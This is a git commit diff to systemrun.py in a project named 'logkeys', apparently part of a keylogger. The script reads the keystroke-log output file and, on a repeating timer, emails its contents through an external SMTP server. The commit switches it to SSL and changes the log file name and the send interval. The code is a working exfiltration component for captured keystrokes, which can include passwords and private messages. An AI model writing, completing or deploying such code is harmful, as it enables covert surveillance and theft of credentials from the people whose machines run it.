ecfe394be2a81a2081329c2a43abd9885eca680e
hakits <hanglinux@163.com>
2015-08-20 23:45:30 +0800

    test and verify systemrun.py time is ok

--- logkeys/systemrun.py
+++ logkeys/systemrun.py
@@ -12,22 +12,22 @@ schedular = sched.scheduler(time.time, time.sleep)
 def sendMail(theEmail, thePasswd):
     systemTime=time.strftime( '%Y-%m-%d-%T', time.localtime(time.time()))
     try:
-        fileobj = open("test.log", "r") #键盘记录的输出文件
+        fileobj = open("keydist.pl", "r") #键盘记录的输出文件
         content = fileobj.read()
     except:
         print "Cannot read file\n"
         exit()
     message = Message()
     message[ 'Subject' ] = 'Log keys' #邮件标题
-    message[ 'From' ] = "anony_mity@sina.com"
+    message[ 'From' ] = ""
     message[ 'To' ] = theEmail
     message.set_payload("当前时间" +systemTime+ "\n" +content) #邮件正文
     msg = message.as_string()
 
-    #smtp = smtplib.SMTP_SSL("smtp.qq.com", port=456, timeout=30)
-    smtp = smtplib.SMTP("smtp.sina.com",port=25, timeout=30)
+    #smtp = smtplib.SMTP_SSL("smtp.qq.com", port=465, timeout=30)
+    smtp = smtplib.SMTP_SSL("smtp.sina.com",port=465, timeout=30)
     #smtp.set_debuglevel(1)  #开启debug模式
-    #smtp.ehlo()            #LJH add  send ehlo to Gmail
+    #smtp.ehlo()            #me add  send ehlo to Gmail
     smtp.starttls()        #使用安全连接
     smtp.login(theEmail, thePasswd)
     smtp.sendmail( theEmail, theEmail, msg) #SMTP.sendmail(from_addr, to_addrs, msg[, mail_options, rcpt_options]) ：发送邮件。这里要注意一下第三个参数，msg是字符串，表示邮件。我们知道邮件一般由标题，发信人，收件人，邮件内容，附件等构成，发送邮件的时候，要注意msg的格式。这个格式就是smtp协议中定义的格式。
@@ -41,15 +41,9 @@ def sendMail(theEmail, thePasswd):
 def perform(inc, theEmail, thePasswd):
     schedular.enter(inc, 0, perform, (inc, theEmail, thePasswd))
     sendMail(theEmail, thePasswd)
-    t3 = time.time()
-    print 'perform: ', t3
-    print (t3-t2)/60
 
 def myMain(inc, theEmail, thePasswd):
     schedular.enter(0, 0, perform, (inc, theEmail, thePasswd))
-    global t2
-    t2 = time.time()
-    print 'myMain: ', t2
     print "myMain start"
     schedular.run()
     print "myMain stop"
@@ -64,5 +58,5 @@ if __name__ == "__main__":
     #emailPasswd = options.passwd
     emailName = ""
     emailPasswd = ""
-    myMain(30, emailName, emailPasswd)  #15表示的是相隔时间，可以根据自己的需求设
+    myMain(600, emailName, emailPasswd)  #15表示的是相隔时间，可以根据自己的需求设
 
